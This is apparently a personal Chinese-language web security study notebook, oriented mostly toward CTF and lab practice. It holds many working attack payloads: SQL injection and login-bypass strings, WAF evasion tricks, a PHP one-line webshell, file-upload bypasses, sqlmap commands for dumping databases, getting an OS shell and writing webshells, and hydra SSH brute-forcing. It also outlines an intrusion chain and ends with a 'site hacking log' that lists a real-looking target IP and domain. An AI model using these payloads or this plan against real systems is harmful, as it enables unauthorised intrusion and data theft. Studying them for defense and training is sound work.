# Web安全笔记

## 每天学点新东西

### OAuth2.0

**作用** ：让(第三方)客户端安全可控地获取用户的授权

#### 名词定义

+   Third-party application：第三方应用程序，又称为客户端
+   HTTP service：HTTP服务提供商
+   Resource Owner：资源所有者，又称用户
+   User Agent：用户代理，例如，浏览器
+   Authorization server：认证服务器
+   Resource server：资源服务器

#### 运行流程

![avatar](http://www.ruanyifeng.com/blogimg/asset/2014/bg2014051203.png)

​	（A）用户打开客户端以后，客户端要求用户给予授权

​	（B）用户同意给予客户端授权

​	（C）客户端使用上一步获得的授权，想认证服务器申请令牌

​	（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌

​	（E）客户端使用令牌，向资源服务器申请获取资源

​	（F）资源服务器确认令牌无误，同意客户端开放资源

### 客户端的授权模式

+   授权码模式（authorization code）
+   简化模式（implicit）
+   密码模式（resource owner password credentials）
+   客户端模式（client credentials）

## SQL 注入

**本质**：把用户输入的数据当代码来执行，违背了“数据与代码分离”的原则。

**关键条件**：

	1.用户能控制输入的内容
	
	2.Web 应用执行的代码中，拼接了用户输入的内容

**攻击**：通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

**寻找注入点**

只要在 id 后面输入任意的字符后，`网站页面报错`，则说明有注入。

因为只要网站报错，就说明我们任意输入的字符被带入到数据库查询了，因此我们可以插入恶意的 SQL 语句，注入攻击就这样产生了。

**猜解数据表**

找到注入点后，进行猜解

```sql
and exists(select * from user)  -- 表存在页面就会返回正常，否则报错
and exists(select * from amdin)
```

**猜解数据列**

```sql
and exists(select password from admin)  -- 存在就返回正常，否则页面报错  aclin
```

**猜解数据列长度**

```sql
and (select top 1 len(admin) from admin)>3  -- len() 返回文本字段中值的长度
-- 若 admin 表中 admin 列的长度大于3则返回正常
```

**猜解数据列内容**

```sql
and (select top 1 asc(mid(admin,1,1)) from admin)>96
-- 如果 admin 列中的第一个字符的 ASCII 码大于97则返回正常
SELECT MID(column_name,start[,length]) FROM table_name; -- 从文本字段中提取字符(起始值为1)
SELECT TOP number|percent column_name(s) FROM table_name;  -- 规定要返回的记录的条数
```

```shell
https://sqlwiki.netspi.com/detection#mysql  # 参考网站
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

product.asp?id=1/1 -- true
product.asp?id=1/0 -- false
```

---

**类型**

+   简单注入

    ‘    and 1=1   or 1=2   ^ 1=1

+   宽字节注入

+   花式绕 MySQL

    结合PHP特性

+   绕关键词检测拦截

    大小写？

+   MongoDB 注入

    NoSQLmap

+   http 头注入

    X-Forward-注入

    refer注入

+   二次注入

    插入型，从另一个界面插入

---

**思路**

+   简单注入，手工或sqlmap跑
+   判断注入点，是否是http头注入？是否在图片处注入
+   判断注入类型
+   利用报错信息注入
+   尝试各种绕过过滤的方法
+   查找是否是通用某模板存在的注入漏洞

---

**Tricks**

```shell
sql-mode = "STRICT_TRANS_TABLES"(默认未开启)
插入长数据截断，插入'admin                      x'绕过或越权访问(束缚攻击？)

注意二次注入
isg2015 web350 username 从 session 中直接带入查询，利用数据库字段长度截断，
\ 被 gpc 后为 \\，但是被截断了只剩下一个 \，引发注入

如果猜解不出数据库的字段，搜索后台，查看源代码，源代码登陆时的表单中的字段一般和数据库的相同

# 绕过安全狗
sel%ect

针对 asp + access，首先来挖掘一下数据库的特性：
1.可代替空格的字符：%09, %0A, %0C, %0D
2.可截断都免语句的注释符有：%00, %16, %22, %27
3.当 %09, %0A, %0C或%0D超过一定长度后，安全狗的防御便失效了
4.UserAgent：BaiduSpider

有 magic_quotes_gpc = on 的情况下，
提交的参数如果带有单引号"'"，就会被自动转义"\'"，使很多注入攻击无效

gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0xFE,
尾字节对应 0x40-0xfe(除0x7f)，刚好涵盖了转义字符\对应的编码 0x5c

0xD50x5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，
于是 %d5%5c 经URL解码后为“诚”

0xD50x5c 不是唯一可以绕过单引号转义的字符，0x81-0xFE 开头 + 0x5c 的字符应该都可以


# 偏移注入

1.Union 合并查询需要列相等，顺序一样
2.select * from admin as inner join 
  index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)
 查询条件是 a 表的 id 列与 b 表的 id 列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回

3.* 代表了所有字段，如查询 admin 表，他有几个字段，* 就代表几个字段
```



MySQL 中有 information_schema 表，可以使用联合查询来查询敏感表中的敏感数据，

> MySQL  ->  数据库名  ->  表名  ->  列名  ->  数据

Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也就只有一个文件。

> Access  ->  表名  ->  列名  ->  数据

而 Access 只能靠暴力猜解的方式进行。

### Sqli-labs 搭建

```shell
git clone https://github.com/Audi-1/sqli-labs.git

修改 sql-connections/sql-labs/db-creds.inc MySQL用户名/密码
放到 Apache 下或者 PHPstudy这种集成工具

From your browser access the sql-labs folder to load index.html
Click on the link setup/resetDB to create database, create tables and populate Data.
Labs ready to be used, click on lesson number to open the lesson page.
Enjoy the labs
```



## XSS

类型：

+   简单存储型 xss 盲打管理员后台
+   各种浏览器 auditor 绕过
+   富文本过滤黑白名单绕过
+   CSP 绕过
+   Flash xss
+   AngularJS 客户端模板 xss

工具：

+   bp
+   hackbar

+   xss 平台
+   swf decompiler
+   flasm
+   doswf(swf加密)
+   Crypt Flow(swf加密)

思路：

+   简单的xss，未作任何过滤，直接利用xss平台盲打管理员cookie
+   过滤标签，尝试各种绕过方法
+   存在安全策略csp等，尝试相应的绕过方法
+   逆向 .swf 文件，审计源码，构造 xss payload

## 代码审计

工具：

+   rips
+   seay
+   githack
+   stings, grep

思路：

+   根据提示，猜测是否需要审计源代码
+   直接找到源代码，或者利用各种找源码的技巧找源码，或利用漏洞查看源码文件
+   人工审计代码，结合题目，找到存在注入的地方，或编写相应脚本等等
+   检索关键函数，admin(), check(), upload()
+   检索关键的文件，config.php, check.lib.php, xxx.class.php

## 文件上传

+   基于前端 JS 的验证

    firebug 修改一下 JS 文件 / 禁用 JS

+   基于文件后缀名的绕过

    后缀名大小写混用

    空格，加点，加下划线，双重后缀名，叠用 phphpp

    PHP345，.inc, .phtml, .phpt, .phps

    %00截断：name=test.jpg0x00

    ​		   1.php%00.png

    ​		   1.aspchr(0)&XXX.jpg,chr(0)

    ​		    /1.php，在1.php前加个空格，在hex中找到20再改为00

    .htaccess(文件重写)：

    ```
    <FilesMatch "95zz.gif">
    
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```

+   基于文件类型的检测

    Content-Type : Multipart/form-data; 大小写绕过

+   在线编辑器漏洞

+   文件包含

+   基于文件头部信息的过滤

    ```shell
    copy xx.png+xxx.php out.jpg  # win下的命令
    # 再修改下后缀名
    ```

```javascript
// 一句话木马
<script language=php>eval($_POST['A'])</script>

// 命令执行
<script language=php> system("ls")</script>
// 牛逼啊，直接能看到本目录下的所有文件
about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php
```

思路：

+   简单的上传文件，查看响应

+   是否只是前端过滤后缀名、文件格式，抓包绕过

+   是否存在截断上传漏洞

+   是否对文件头检测(图片马等等)

+   是否对内容进行了检测

+   是否上传吗被查杀，免杀

+   是否存在各种解析漏洞

+   http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，

    可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码

## PHP 特性

**类型：**

+   弱类型
+   intval
+   strpos 和 ===
+   反序列化 + destruct
+   \0 截断
+   iconv 截断
+   parse_str()
+   伪协议

在线调试环境：http://www.shucunwang.com/RunCode/php

**思路：**

+   判断是否存在 PHP 中截断特性

+   查看源码，判断是否存在 PHP 弱类型问题

+   查看源码，注意一些特殊函数，eval(), system(), intval()

+   构造变量，获取flag

+   是否存在 HPP

+   魔法哈希 0e开头，sha1(), md5()无法处理数组

    如果要找出 `0e` 开头的 hash 碰撞，可以用如下代码

    ```php
    <?php
     
    $salt = 'vunp';
    $hash = '0e612198634316944013585621061115';
     
    for ($i=1; $i<100000000000; $i++) {
        if (md5($salt . $i) == $hash) {
            echo $i;
            break;
        }
    }
     
    echo 'done';
    ```

    常见的payload:

    ==md5==

    ​        QNKCDZO

    ​        0e830400451993494058024219903391

    ​        s155964671a

    ​        0e342768416822451524974117254469

    ​        s214587387a

    ​        0e848240448830537924465865611904

    ​        s878926199a

    ​        0e545993274517709034328855841020

    ​        s1091221200a

    ​        0e940624217856561557816327384675

    ​        s1885207154a

    ​        0e509367213418206700842008763514

    ​        s1836677006a

    ​        0e481036490867661113260034900752

    ​        s1184209335a

    ​        0e072485820392773389523109082030

    ​        s1665632922a

    ​        0e731198061491163073197128363787

    ​        s1502113478a

    ​        0e861580163291561247404381396064

    ​        s532378020a

    ​        0e220463095855511507588041205815

    ==sha1==	
    ​	10932435112: 0e07766915004133176347055865026311692244
    ​	aaroZmOk: 0e66507019969427134894567494305185566735
    ​	aaK1STfY: 0e76658526655756207688271159624026011393
    ​	aaO8zKZF: 0e89257456677279068558073954252716165668
    ​	aa3OFF9m: 0e36977786278517984959260394024281014729

    ==crc32==

    ​	6586: 0e817678

    两个 md5 一样的字符串

    ```python
    from binascii import unhexlify
    from hashlib import md5
    from future.moves.urllib.parse import quote
    
    input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
    'd8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')
    
    print(quote(input1))
    print md5(input1).hexdigest()
    
    input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')
    print md5(input2).hexdigest()
    print(quote(input2))
    ```

    另外一组 md5 一样的字符串

    ```python
    from array import array
    from hashlib import md5
    input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])
    input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1<<10, 0, 0, 0, 0, 1<<31, 0, 0, 0, 0, 0])])
    print(input1 == input2) # False
    print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
    print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
    ```


**伪协议**

+   php://filter – 对本地磁盘文件进行读写

    查看源码：file=php://filter/read=convert.base64-encode/resource=index.php

+   php://input 伪协议需要服务器支持，同时要求 allow_url_include = on

    fn=php://input，然后再 post 一个 fn=xx

+   php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区

+   php://memory 总是把数据存储在内存中

+   php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中

DATA伪协议，分号和逗号有争议

+   data:,文本数据
+   data:text/plain ,文本数据
+   data:text/html,HTML代码
+   data:text/css;base64,css代码
+   data:text/javascript;base64,javascript代码
+   data:image/x-icon;base64,base64编码的 icon 图片数据
+   data:image/gif;base64,base64编码的gif图片数据
+   data:image/png;base64,base64编码的png图片数据
+   data:image/jpeg;base64,base64编码的png图片数据

>   glob:// 查找匹配的文件路径模式



**文件操作相关**

```php
// 列出目录
scandir('/xxx')  // . 当前目录 .. 上级目录 / 根目录
    
// 输出文件内容
show_source('flag.php');
highlight_file('flag.php');
var_dump(file('flag.php'));  // 以下两个以数组形式输出
print_r(file('flag.php'));

// 读取文件内容
file_get_contents('flag.php');
file_get_contents('http://www.baidu.com')  // 读取远程内容，可用作爬虫
```





## 后台登录类

**类型：**

+   各种万能密码绕过
+   变形的万能密码绕过
+   社工的方式得到后台密码
+   爆破的方式得到后台密码
+   各种 cms 后台登陆绕过

```shell
# asp万能密码
'or'='or'

# aspx万能密码
1： "or "a"="a
2： ')or('a'='a
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6： "or 1=1--
7：'or'a'='a
8： "or"="a'='a
9：'or''='
10：'or'='or'
11: 1 or '1'='1'=1
12: 1 or '1'='1' or 1=1
13: 'OR 1=1%00
14: "or 1=1%00
15: 'xor
16: 新型万能登陆密码
username: ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
passwd: 1
Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
Password=1
17..admin' or 'a'='a 密码随便

# PHP万能密码
'or'='or'
'or 1=1/*  字符型 GPC是否开都可以使用
User: something
Pass: ' OR '1'='1

# jsp 万能密码
1'or'1'='1
admin' OR 1=1/*
用户名：admin （系统存在此用户)
密码：1'or'1'='1
```



**思路：**

+   根据提示，判断是否是普通的登陆绕过，或是利用社工的方式
+   普通登陆绕过尝试各种万能密码绕过，或通过普通的 sql 注入漏洞得到账号密码，或 xss 盲打，sqlmap注入
+   如果是 cms 系统登陆，查看是否有相应版本的后台绕过漏洞
+   如果是社工方式，谷歌，百度，社工库
+   爆破获取
+   robots.txt 找找后台

## 加解密

**类型：**

+   简单的编码(多次 base64 编码)
+   密码题(hash 长度扩展、异或、移位加密各种变形)
+   js 加解密
+   根据加密源码写解密脚本

**思路：**

+   判断是编码还是加密
+   如果是编码，判断编码类型，尝试解码或多次解码
+   如果是加密，判断是现有的加密算法，还是自写的加密算法
+   是否是对称加密，是否存在秘钥泄露等，获取秘钥解密
+   根据加密算法，推断出解密算法

## 流量分析

## 其他

脑洞题

**类型：**

+   爆破，包括MD5、爆随机数、验证码识别

+   社工，花式查社工库、微博、QQ签名、whois、谷歌  [天涯社工库](www.findmima.com)

+   SSRF，包括花式探测端口、302跳转、花式协议利用、gophar直接去shell等等

+   协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、

    花式藏FLAG、花式分析数据包

    X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。

    标准格式如下：X-Forwarded-For: client1, proxy1, proxy2

+   XXE，各种 XML 存在地方(rss/word/流媒体)、各种XXE利用方法(文件读取)

## 工具

### Burp Suite

+ Proxy

    拦截 HTTP /S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。

+ Spider

    应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。

+ Scanner[仅限专业版]

    一个高级的工具，执行后，它能自动地发现 web应用程序的安全漏洞。

+ Intruder

    高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。

+ Repeater

    靠手动操作来补发单独的 HTTP请求，并分析应用程序响应的工具。

+ Sequencer

    用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。

+ Decoder

    进行手动执行或对应用程序数据者智能解码编码的工具。

+ Comparer

    通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 

```shell
cupp -i  # 加入社工信息，生成特有字典
proxy -> history  # 找到登录信息
Send to intruder
clear§  # 清楚所有§
add§  # 在需要爆破的地方加§
payloads -> load... # 导入字典
options -> number of threads  # 设置多线程
start attack  # 观察状态码和长度
```

若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 `不使用代理` ：<u>localhost,127.0.0.1</u> 即可

**全局参数设置和使用**

+ Project option

#### 实例

##### 目录与文件扫描

##### 暴力破解后台

##### 暴力破解一句话木马

##### 配合 sqlmap 实现被动式注入发现

##### 突破文件上传

+ 分析 medium 级别代码

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

        // Is it an image?
        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
                ( $uploaded_size < 100000 ) ) {

                // Can we move the file to the upload folder?
                if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], 						$target_path ) ) {
                        // No
                        $html .= '<pre>Your image was not uploaded.</pre>';
                }
                else {
                        // Yes!
                        $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
                }
        }
        else {
                // Invalid file
                $html .= '<pre>Your image was not uploaded. We can only accept JPEG 				or PNG images.</pre>';
        }
}
```

这里分别通过`$_FILES['uploaded']['type']`和`$_FILES['uploaded']['size']`获取了上传文件的 MIME类型和文件大小。

MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开，如jpg图片的MIME为`image/jpeg`。

因而medium与low的主要区别就是对文件的MIME类型和文件大小进行了判断，这样就只允许上传jpg格式的图片文件。

`../`即为上级目录

+ **用 Burp 抓包改下 `Content-Type` 为 `image/jpeg`**，上传成功

+ 上传正常文件，拦截上传内容，将代码从请求头插进去

+ 文件包含


##### 数据获取测试

### sqlmap

```shell
# 网站有防注入过滤，当提交and 1=1时，返回了非法操作的提示，再在网站后面添加其他字符，只要报错，就说明有注入
# Acess 中转注入攻击
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables
# 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地
```

```shell
# 检查注入点：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11

# 爆当前数据库信息：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db

# 指定库名列出所有表
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
('vhost48330' 为指定数据库名称)

# 指定库名表名列出所有字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
('admin' 为指定表名称)

# 指定库名表名字段dump出指定字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
```

**参数解释**

```
* 在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分

--data
使用post方式提交的时候，就需要用到data参数了

-p
当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间

--level
不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。

--random-agent
使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent

--technique
这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。
支持的探测方式如下：
B: Boolean-based blind SQL injection（布尔型注入）

E: Error-based SQL injection（报错型注入）

U: UNION query SQL injection（可联合查询注入）

S: Stacked queries SQL injection（可多语句查询注入）

T: Time-based blind SQL injection（基于时间延迟注入）
```

**Access注入**

```
sqlmap -u 注入点url //判断是否有注入

sqlmap -u 注入点url --tables //access直接猜表

sqlmap -u 注入点url  --colums -T admin //爆出admin表，猜解它的字段

sqlmap -u 注入点url  --dump -T admin -C "username,password"  //猜字段内容
```

**MySQL数据库注入**

```
sqlmap -u url  --dbs  //获取数据库

sqlmap  -u  url  -D 指定的数据库 --tables //获取数据库中的表

sqlmap  -u  url  -D 指定的数据库 -T 表名  --columns  //获取表字段

sqlmap  -u  url  -D 指定的数据库 -T 表名  -C id,user,pass --dump  //获取字段内容
```

**Cookie注入**

网站有判断，不让用and,update等参数时就得加上Cookie。

```
sqlmap -u url --cookie="cookie值" --dbs(或)--tables --level 2
```

**POST表单注入**

注入点：

```
http://testasp.vulnweb.com/Login.asp 
```

**几种方式：**

```
sqlmap -r burp拦截数据.txt -p Pass(测试参数) //从文件读取数据包

sqlmap -u http://testasp.vulnweb.com/Login.asp  --forms //自动搜索表单

sqlmap -u http://testasp.vulnweb.com/Login.asp  --data "Name=1&Pass=1"  //手动添加数据
```

**获取系统交互shell**

```
1.sqlmap -u http://url.. --os-shell  //或者windows可以用--os-cmd 或--sql-shell

2.选择网站服务端语言

3.填写网站根目录C:/www/
```

**伪静态注入**

```
sqpmap  -u http://victim.com/id/666*.html --dbs  //在html扩展名前加个'*'
```

**请求延时**

Web防注入措施，在访问两次错误页面后，第三次必须访问正确的页面

```
--delay 2 //延时两秒访问

--safe-freq 30  //人为配置次数
```

**绕过WAF防火墙**

```
sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch

--tamper "space2morehash.py" //使用tamper脚本绕过

类似脚本

space2hash.py base64encode.py charencode.py
```

**file参数使用**

必须为dba权限

```
sqlmap -u url --is-dba  //查看是否dba权限

sqlmap -u url --file-write=本地木马路径(D:/shell.php)

--file-dest=目标根目录(C:/www/shell.php)
```

**Tamper**

DIY 部分，最具可玩性的地方。

基本注入语句是一样的，可不同的网站过滤规则不一样，此时就需要编写Tamper进行本地化。

+   框架

```python
# sqlmap/tamper/escapequotes.py

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace("'", "\\'").replace('"', '\\"')

'''
priority 表示脚本的优先级，用于有多个脚本的情况
'''
```

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    data = '''{"admin_user":"admin%s","admin_pass":65};'''
    payload = payload.lower()
    payload = payload.replace('u', 'u0075')
    payload = payload.replace('o', 'u006f')
    payload = payload.replace('i', 'u0069')
    payload = payload.replace(''', 'u0027')
    payload = payload.replace('"', 'u0022')
    payload = payload.replace(' ', 'u0020')
    payload = payload.replace('s', 'u0073')
    payload = payload.replace('#', 'u0023')
    payload = payload.replace('>', 'u003e')
    payload = payload.replace('<', 'u003c')
    payload = payload.replace('-', 'u002d')
    payload = payload.replace('=', 'u003d')
    return data % payload
```

+   tamper()

返回处理后的 payload

例如服务器上有这么几行代码

```php
$id = trim($POST($id),'union');
$sql="SELECT * FROM users WHERE id='$id'";
```

而我们的payload为

```
-8363'  union select null -- -
```

这里union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper

```python
def tamper(payload, **kwargs):
    return payload.replace('union','uniounionn')
```

保存为replaceunion.py，放到sqlmap/tamper/下

执行的时候带上 --tamper=replaceunion 的参数，就可以绕过该过滤规则

[官方tamper](https://blog.csdn.net/hxsstar/article/details/22782627)

+   dependencies()

声明脚本的适用/不适用范围，可为空

```python
sqlmap/tamper/echarunicodeencode.py

from lib.core.common import singleTimeWarnMessage

def dependencies():
singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])

# singleTimeWarnMessage() 用于在控制台中打印出警告信息
```

+   kwargs

在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明

```
# sqlmap/tamper/vanrish.py

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
    return payload
```

这个脚本是为了更改 X-originating-IP，以绕过WAF，另一个 kwargs 的使用出现于 xforwardedfor.py，也是为了改 header 以绕过 waf

+   部分常数值

```python
# sqlmap/lib/enums.py

class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100

class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"
```

### nosqlmap

### nmap

常用指令：

```shell
nmap -sP 192.168.1.100        # 查看一个主机是否在线

nmap 192.168.1.100            # 查看一个主机上开放的端口

nmap -sV -O 192.168.0.100  	  # 判断目标操作系统类型

nmap -sS 192.168.1.100        # 半开放syn扫描

nmap -p 1-1000 192.168.1.100  # 扫描指定端口范围

nmap -p 80 192.168.1.100      # 扫描特定端口

nmap -sV 192.168.1.100  	  # 查看目标开放端口对应的协议及版本信息

# 判断防火墙的扫描
nmap -sF IP
nmap -sA IP
nmap -sW IP //ACK,探测防火墙扫描
```

>   其他参数
>   -sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到
>   -Pn 跳过Ping测试(防火墙)，扫描指定目标
>   -v 详细模式V越多就越详细
>   -p 80 ping指定端口
>   --script=script_name 使用脚本
>   [脚本列表](http://nmap.org/nsedoc/scripts/)

**nmap脚本扫描：分类：**

>   auth: 负责处理鉴权证书（绕开鉴权）的脚本

>   broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务

>   brute: 提供暴力破解方式，针对常见的应用如http/snmp等

>   default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力

>   discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等

>   dos: 用于进行拒绝服务攻击

>   exploit: 利用已知的漏洞入侵系统

>   external: 利用第三方的数据库或资源，例如进行whois解析

>   fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽

>   malware: 探测目标机是否感染了病毒、开启了后门等信息

>   safe: 此类与intrusive相反，属于安全性脚本

>   version: 负责增强服务与版本扫描（Version Detection）功能的脚本

>   vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067

使用实例：

```shell
nmap --script=auth IP  
//负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令
http-php-version     //获得PHP版本信息
Http-enum               //枚举Web站点目录
smtp-strangeport   //判断SMTP是否运行在默认端口
dns-blacklist         //发现IP地址黑名单
```

------

```shell
nmap --script=vuln 192.168.137.* //扫描常见漏洞
smb-check-vulns  //检测smb漏洞
samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞
```

------

扫描wordpress应用的脚本

```
1.http-wordpress-plugins

2.http-wordpress-enum

3.http-wordpress-brute
```

测试WAF是否存在

```shell
nmap -p 80,443 --script=http-waf-detect 192.168.0.100

nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
```

### AWVS

### Maltego

### Social-Engineer Toolkit

### Metasploit

### Hydra

爆破利器

**用法：**

```
hydra <参数> <IP地址> <服务名>  
hydra的一些参数:  
-R 继续从上一次的进度开始爆破  
-s <port> 指定端口  
-l <username> 指定登录的用户名  
-L <username-list> 指定用户名字典  
-p <password> 指定密码  
-t <number> 设置线程数  
-P <passwd-list> 指定密码字典  
-v 显示详细过程  
```

实例 爆破 ssh 登录密码

```shell
hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh
```

## 思路

+   信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)
+   主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP
+   入手二级域名，挨个排查，二级域名的个数差不多能有40个
+   根据二级域名的名字选择 upload edit 等等这种具有操作功能的站点入手
+   edit网站存在svn泄露，但是是最原始wc.db的形式，利用 sqlite 把源码还原出来
+   进行代码审计，快速定位代码，全文搜索 exec, upload 等等危险操作
+   审计到一个 exec 命令执行，发现需要用管理员权限
+   回溯代码，定位管理员登陆功能，审计处 cookie 算法可破解
+   伪造 cookie 反弹 shell，上去以后发现很多站点都在上面，权限不够
+   查看一下版本 (2.6.18-194.11.3.el5)
+   利用之前 ctf 中的一个一句话提权成功，然后大杀四方

---

+   成功登陆后台 -> getshell
+   getshell 失败 -> 转换思路 -> 挖掘其他漏洞 (sqlinjection) -> 列库收集用户信息(外网撕出扣子网内网钻)
+   用户名密码 -> 撞邮箱 -> 在邮箱中搜索关键信息 -> 拿到VPN
+   通过 VPN 访问文件服务器 -> 写脚本 getshell

---

+   xss -> 打到后台 -> 403 -> ajax 抓取页面回转出来 -> sql 注入 -> getflag

+   Bypass Waf 注入 (%00,||,seselectlect等等) 国内CTF Web常见题型

+   代码审计 花式杂耍PHP各种特性(反序列化，弱类型等等)

+   文件上传 花式 Bypass 上传(.php111 .inc .phtml .phpt)

+   各种当前热点漏洞

    扫描路径 -> phpinfo -> php7 -> php7apachce -> 查看文档 -> 花式绕坑 -> getshell

+   社会工程学(常用密码等等)

+   各种Web漏洞夹杂

+   具有内网环境的真是渗透场景 

**信息收集：**

 + web服务器：Apache、Tomcat、IIS
 + 跑在什么系统上
 + 可以利用已知漏洞绕过题目直接拿flag





## 日站记录

### 信息收集

+ IP：154.80.253.139
+ 可能域名：0539y.com
